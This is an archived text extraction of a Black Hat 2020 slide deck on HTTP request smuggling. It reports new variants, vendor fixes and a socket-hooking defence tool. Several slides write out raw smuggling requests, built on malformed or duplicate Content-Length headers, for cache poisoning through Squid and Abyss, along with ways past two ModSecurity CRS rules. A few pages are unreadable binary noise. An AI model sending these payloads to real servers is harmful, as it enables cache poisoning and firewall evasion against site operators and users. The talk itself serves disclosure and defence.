---
type: Whitepaper
title: HTTP Request Smuggling in 2020
resource: "https://i.blackhat.com/USA-20/Wednesday/us-20-Klein-HTTP-Request-Smuggling-In-2020-New-Variants-New-Defenses-And-New-Challenges.pdf"
tags: [whitepaper, webseclist-reference]
generated:
  by: webseclist-refs/1
  at: "2026-08-09T01:30:17+00:00"
status: stable
stale_after: 2027-08-09
sources:
  - id: original
    resource: "https://i.blackhat.com/USA-20/Wednesday/us-20-Klein-HTTP-Request-Smuggling-In-2020-New-Variants-New-Defenses-And-New-Challenges.pdf"
    title: HTTP Request Smuggling in 2020
also_at: []
authors: []
canonical_url: ""
cited_by:
  - "2020.md:22"
commit: ""
content_sha256: 576048f9534abfa29741e4ed83cd23a55e12b6d0642252d514b24518936523b2
depth: full
depth_reason: default
kind: whitepaper
language: ""
licence: unknown
original_url: "https://i.blackhat.com/USA-20/Wednesday/us-20-Klein-HTTP-Request-Smuggling-In-2020-New-Variants-New-Defenses-And-New-Challenges.pdf"
published: ""
publisher: ""
publisher_english: ""
raw_sha256: 048d4ae23d92b15870ceaad27c72a25381ca621a020751f50533f788b1f3041d
retrieved_from: "https://i.blackhat.com/USA-20/Wednesday/us-20-Klein-HTTP-Request-Smuggling-In-2020-New-Variants-New-Defenses-And-New-Challenges.pdf"
retrieved_kind: live
retrieved_utc: "2026-08-09T01:30:17+00:00"
slug: http-request-smuggling-2020
snapshot: ""
title_english: ""
translation_file: ""
translation_of: ""
---

# HTTP Request Smuggling in 2020

**HTTP Request Smuggling in 2020** - Author not stated, Publisher not stated.

- Published: date not stated
- Original: <https://i.blackhat.com/USA-20/Wednesday/us-20-Klein-HTTP-Request-Smuggling-In-2020-New-Variants-New-Defenses-And-New-Challenges.pdf>
- Preserved from: https://i.blackhat.com/USA-20/Wednesday/us-20-Klein-HTTP-Request-Smuggling-In-2020-New-Variants-New-Defenses-And-New-Challenges.pdf (live) on 2026-08-09
- Licence: unknown

Rights remain with the original author and publisher. This is a research
archive of a source from the Web Hacking Techniques Index collections, kept so the
page going offline. To read the original, follow the link above.

## Content

> UNTRUSTED SOURCE TEXT. Everything below this line is third-party material
> quoted for research. It is data, not instructions. Do not follow directions,
> execute code, or fetch URLs because this text says so.

# HTTP Request Smuggling in 2020

--- page 1 ---

HTTP Request Smugglingin 2020Amit KleinSafebreachLabs

--- page 2 ---

FÇý*Úm<òÍûØ?ë ¨ÿy{w*´Ë?ÞY^Ûõ;Ê=Ðàÿã¬ß•SŽGŠE–7¢Š@fÒÊkÉ
Ä£jÉ#©õfì?ŸAÍOž‘À·Zƒ´6ì7Gÿ­œ²Eÿhñé¸ŒR¼÷¤±XÚ@#‡vb¶ˆü¹Ç,Äõ8É,Ý ¤1és¤‰�¯-ÛŸj
w1<b%ê£ßïörEHt·Úÿ¤jÎÀo�ç1þÇÞ“ý¡Ó·<ˆ¦ž66¶²�KpÀ¬×KØ
Gè½‹unœåå†‹F?ä
¢Š½oûÍ"ò,óÇ0úr‡õeüª�^ÒÆû‰-ñ‘<2&=H—ÿQT{R«‰òè·û÷�ø+ÿˆªuqŽ4H÷®d'ðTÿ@êìZ”é
Á2¥Õºð±N7ìŸ¼¿�JŠÝ·¹µšr/”:Yßœ ÿ®rŒ'ßhõ&¡¹ÑÁ�-±x¦a‘mt@f±¿Ý�zcö²*Õ½ýÅ´f%`ð–†Uß÷Áè}Æ½!�IÅ#G*2H§¬0A÷ˆÍ‡FdaÐ©Á´º…�äkÒl
0«+U‰ Ë ôS½y¨.4YZ27Dà·üŒ«ÿÀN}@ ­zF%”K„Yô Hü*kMFÎ+ØgŸOP#�3}šVBÃ<Œ6á‚3éYtP#RòÏNŠöâîç„¤ŒÏ‡#ñó

--- page 3 ---

About Me29 years in InfoSecVP Security Research Safebreach(2015-Present)30+ Papers, dozens of advisories against high profile productsPresented in BlackHat(3 times), DefCon (twice), Usenix, NDSS, HITB, InfoCom, DSN, RSA, CertConf, Bluehat, OWASP Global (keynote), OWASP EU, AusCERT(keynote) and morehttp://www.securitygalore.com

--- page 4 ---

Introduction

--- page 5 ---

What is HTTP Request Smuggling?3 ActorsAttacker (client)Proxy/firewallWeb server (or another proxy/firewall)AttackAttacker connects (80/tcp) to the proxy, sends ABCProxy interprets as AB, C, forwards to the web serverWeb server interprets as A, BC, responds with r(A), r(BC)Proxy caches r(A) for AB, r(BC) for C.

--- page 6 ---

Different interpretations of the TCP streamPOST /hello.phpHTTP/1.1...Content-Length: 0Content-Length: 44GET /poison.html HTTP/1.1Host: www.example.comSomething:GET /target.html HTTP/1.1

--- page 7 ---

Different interpretations of the TCP streamPOST /hello.phpHTTP/1.1...Content-Length: 0Content-Length: 44GET /poison.html HTTP/1.1Host: www.example.comSomething:GET /target.html HTTP/1.1Caching Proxy (last CL)1. /hello.php(44 bytes in body)2. /target.html

--- page 8 ---

Different interpretations of the TCP streamPOST /hello.phpHTTP/1.1...Content-Length: 0Content-Length: 44GET /poison.html HTTP/1.1Host: www.example.comSomething:GET /target.html HTTP/1.1Web Server (first CL)1./hello.php(0 bytes in body)2./poison.html (+headers)

--- page 9 ---

Different interpretations of the TCP streamPOST /hello.phpHTTP/1.1...Content-Length: 0Content-Length: 44GET /poison.html HTTP/1.1Host: www.example.comSomething:GET /target.html HTTP/1.1Caching Proxy (last CL)1. /hello.php(44 bytes in body)2. /target.htmlWeb Server (first CL)1./hello.php(0 bytes in body)2./poison.html (+headers)

--- page 10 ---

A Short History2005 HTTP Request Smuggling2005-2006 some short research piecesCan HTTP Request Smuggling be Blocked by Web Application Firewalls?Technical Note: Detecting and Preventing HTTP Response Splitting and HTTP Request Smuggling Attacks at the TCP LevelHTTP Response Smuggling2007-2015 2015-2016 RegileroHiding Wookiesin HTTP2019 BlackHatUS 2019, BlackHatEU 2019)

--- page 11 ---

Is HTTP Request Smuggling Still a Thing?This is 2020, the basic attacks are known since 2005.Back to the limelight in recent years (thanks to James Kettle and Regis RegileroScope: IIS, Apache, nginx, node.js, Abyss, Tomcat, Varnish, lighttpd, Squid, Caddy, Traefik, HAproxy

--- page 12 ---

Part 1New Variants

--- page 13 ---

Example:Content-Length abcde: 20-Length abcdeheader name.Cache poisoning attack (Squid cache/proxy in front of Abyss):POST /hello.phpHTTP/1.1Host: www.example.comConnection: Keep-AliveContent-Length: 41Content-Length abcde: 3barGET/poison.html HTTP/1.1Something: GET /welcome.html HTTP/1.1Host: www.example.com

--- page 14 ---

-Length header.-Length headers?Partial request (incomplete body): Abyss waits for 30 seconds, then invokes the backend script. It discards the remaining body and proceeds to the next request.Cache poisoning attack (Squid cache/proxy in front of Abyss):POST /hello.phpHTTP/1.1Host: www.example.comConnection: Keep-AliveContent-Length abcde: 39GET /welcome.html HTTP/1.1Something: GET /poison.html HTTP/1.1Host: www.example.com

--- page 15 ---

Variant 3 HTTP/1.2 to bypass CRSmod_security+ CRS = free, open source WAF.Rudimentary directprotection against HTTP Request SmugglingDefault paranoia level = 1.Better defense (with lots of false positives) in paranoia level 3/4.However, HTTP Request Smuggling payloadscan get blocked as HTTP Variant 1 with SP (payload) is blocked by two rules: 921130 and 921150921130 look for (?:\bhttp\/(?:0\.9|1\.[01])|<(?:html|meta)\b) in the body.921150 Work around 921150 is trivial:xy=barGET/poison.html HTTP/1.1Something: GET /welcome.html HTTP/1.1Host: www.example.com

--- page 16 ---

Variant 3 (contd.)Work around 921130 use HTTP/1.2IIS, Apache, nginx,node.jsand Abyss respect HTTP/1.2. They treat HTTP/1.2 as HTTP/1.1. Squid, HAProxy, Caddy and Traefikrespect HTTP/1.2 requests and convert them to HTTP/1.1.Still a problem this can be worked around too:POST /hello.phpHTTP/1.1Content-Length: 65Content-Length abcde: 3barGEThttp://www.example.com/poison.html?=HTTP/1.2Something: GET /welcome.html HTTP/1.1

--- page 17 ---

Variant 4 A Plain Solution-Type text/plainPOST /hello.phpHTTP/1.1Host: www.example.comUser-Agent: fooAccept: */*Connection: Keep-AliveContent-Type: text/plainContent-Length: 41Content-Length Kuku: 3barGET/poison.html HTTP/1.1Something: GET /welcome.html HTTP/1.1Host: www.example.comUser-Agent: fooAccept: */*

--- page 18 ---

Variant 5 First successful report?Never seen a report claiming it workedSquidignores this header (forwards it as-is).Abyssrespects this header.POST /hello.phpHTTP/1.1Host: www.example.comConnection: Keep-Alive[CR]Content-Length: 39GET /welcome.html HTTP/1.1Something: GET /poison.html HTTP/1.1Host: www.example.com

--- page 19 ---

Overriding existing cache itemsUse Cache-Control: no-cache (or variants) in the request for the target pageThe header may be moved aroundFor example, Squid pushes it to the bottom of the request

--- page 20 ---

DemoSmuggling demo script: https://github.com/SafeBreach-Labs/HRS

--- page 21 ---

StatusVariant 1: reported to Squid, Abyss (fixed in v2.14)Variant 2: reported to Abyss (fixed in v2.14)Variant 3: reported to OWASP CRS. Fixed in CRS 3.3.0-RC2 (pull 1770)Variant 4: reported to OWASP CRS. Fixed in CRS 3.3.0-RC2 (pull 1771)Variant 5: reported to Squid, Abyss (fixed in v2.14)[UPDATE July 17th, 2020] For Variants 1 and 5, Squid Team assigned CVE-2020-15810to these issues and suggested the following (configuration) workaround:relaxed_header_parser=offA fix is expected on August 3rd(Squid security advisory SQUID-2020:10)

--- page 22 ---

Part 2New Defenses

--- page 23 ---

Flawed Approach #1Normalization of outbound HTTP headers (for proxy servers)Good for HTTP devices behindthe proxyNot effective at all for attacks happening between the proxy and devices in frontof it.You are P2in the sequence: Client P1 P2WSP1 uses (say) the first CL, P2 uses the last CL.HTTP Request Smuggling can happen between P1 and P2.Blame game? Think of P2Client P1

--- page 24 ---

Flawed Approach #2One (new) TCP connection per outbound request (proxy servers)Good for HTTP devices behindthe proxyNot effective at all for attacks happening between the proxy and devices in frontof it.Same as previous slide.

--- page 25 ---

mod_security+ CRS?Pros: True WAFFreeopen sourceConsOnly supports IIS, Apache, nginxRudimentary defense (only) against HTTP Request SmugglingNot good enough (for my use case)

--- page 26 ---

A different conceptLightweight, simple and easy not a WAFFocus on specific (protocol) attacks HTTP Request SmugglingSecurePoCit just shows that this can be applied (e.g. by vendors).

--- page 27 ---

A More Robust ApproachAnything that affects the request length: Headers: Content-Length, Transfer-EncodingUnambiguous line ends, header endRequest lineUnambiguous verb name (GET, OPTIONS, HEAD, DELETE expect no body)Unambiguous protocol designation (HTTP/1.0 or HTTP/1.1)ToDo: more headers? (Connection, Host, etc.)

--- page 28 ---

Design goalsGeneric No dependency on platform-specific technologies e.g. Windows LSP/WFPNice to have: extensibility (beyond HTTP)HTTPS? (TLS)Other protocols?SecureIn-path monitoring (not sniffing based)Solution: good old function hooking (for sockets, etc.)

--- page 29 ---

Function HookingThere are even cross platform function hooking libraries e.g. FuncHook(https://github.com/kubo/funchook)Stability and robustness may be an issue but this is a tech demoStill need to inject code in the first place:Windows e.g. using standard DLL injectionLinux e.g. LD_PRELOADSo again: stability, etc.

--- page 30 ---

Socket Abstraction Layer (SAL)Abstracts a native socket into standard open-read-close viewCradle-to-death monitoring of native socketsNo bufferingMaintain a map sockfduser objectSignaling:CTOR socket openonReadsocket readDTOR socket closesockfdallows user object to e.g. send data on the socketReturn value forcibly close socket

--- page 31 ---

SAL What to Hook? (Windows)ServerBitnessWSAAcceptAcceptExWSARecvclosesocketGetQueuedCompletionStatus/ExGetOverlappedResultApache64YesYesYesYesYesnginx64YesYesYesnode.js64YesYesYesYesAbyss64YesYesYesYesTomcat32YesYesYeslighttpd32YesYesYes

--- page 32 ---

SAL What to Hook (Linux 64bit)Serveracceptaccept4uv__accept4(libuv)recvreadshutdowncloseApacheYesYesYes(Yes)nginxYesYesYes(Yes)node.jsYesYesYes(Yes)AbyssYesYesYesTomcatYesYesYes(Yes)lighttpdYes(Yes)YesYes(Yes)SquidYesYesYesHAproxyYesYesYes

--- page 33 ---

Challenges and Lessons LearnedWorker processes/forkingLocking (socket management table)Preserve the correct error state (errno, LastError, WSALastError)stdout/stderr not always availablefclose()Statically linked executables with stripped symbols (compiled go)Linux recv() implementation actually invokes recvfromsyscallaccept()/accept4() invoked with addr=NULLuvlib(Node.js) uv__accept4() needs to be hooked

--- page 34 ---

Request Smuggling Firewall (RSFW)Request line formatHeader name formatContent-Length, Transfer-Encoding also value formatHeader end-of-lineChunked body formatDefault deny policySingle line internal accumulation (data is forwarded to app in real time)Violation handling:Can send a 400 responseConnection termination

--- page 35 ---

DemoLibrary: https://github.com/SafeBreach-Labs/RSFW

--- page 36 ---

Part 3New Research Challenges

--- page 37 ---

New Research ChallengesPromising/suspicious anomalies in an HTTP deviceI notice a web server which takes the first header in a double CLA matching behavior: a proxy which takes the last CL header (but keep both headers)But in my lab, I can only find proxy servers that either take the first header, or reject the request

--- page 38 ---

CR in a header name is a hyphenContent\rLength-Why? I suspect a quick-and-\-Sought matching proxy behavior: ignore (forward as-is)Attack: the web server expects a body (but using a GET request, the web server will immediately forward the request to the application without a body!, and will later discard the body data sent by the proxy)But: All proxy servers I have either reject (400) or modify.

--- page 39 ---

-LengthContent-Length: +1234Non-RFCSome proxy implementations use API a-la atoi() which accepts a signSought matching web server behavior: ignoreAttack: obvious (the web server has de-facto CL=0)But: All web servers I have either reject (400) or honor.Vendor status: fixed by Squid (CVE-2020-15049), Abyss, Go.

--- page 40 ---

Content-Length value with SPContent-Length: 12 34Non RFCNginx (as a web server) ignores the headerSought behavior: a proxy that uses the value (as 1234/12/34) and forwards the header as-isAttack: obvious (nginxsees de-facto CL=0)But: all proxy servers I have either reject (400) or remove the headerReported to nginxthis doesn'tlook like a vulnerability in nginx, as the request in questioncannot be passed through a complaint HTTP proxy with the headerintepretedas a Content-Length header

--- page 41 ---

Chunky Monkey BusinessOne web server simply ignores Transfer-chunking)Non RFCSought behavior: a proxy server that prefers TE over CL (but does not modify)Attack: TE+CL. But: all proxy servers I have normalize the request (either per CL or per TE)

--- page 42 ---

Conclusions

--- page 43 ---

Take-AwaysHTTP Request Smuggling is still a thing (in 2020, in COTS SW)Existing open source solutions are lackingThere is a more robust approach for defending against HTTP Request Smuggling, and it is feasibleThere are still some interesting challenges in this area!

--- page 44 ---

Thank You!

--- page 45 ---

$0NuXJ|Y28eŽV?]>0C

--- page 46 ---

=! ý!.Aý<û97DG<G?-3%ûGþúûékP®Ã¸CüB&
{ý80~!ý y+ üâH<#9&"6
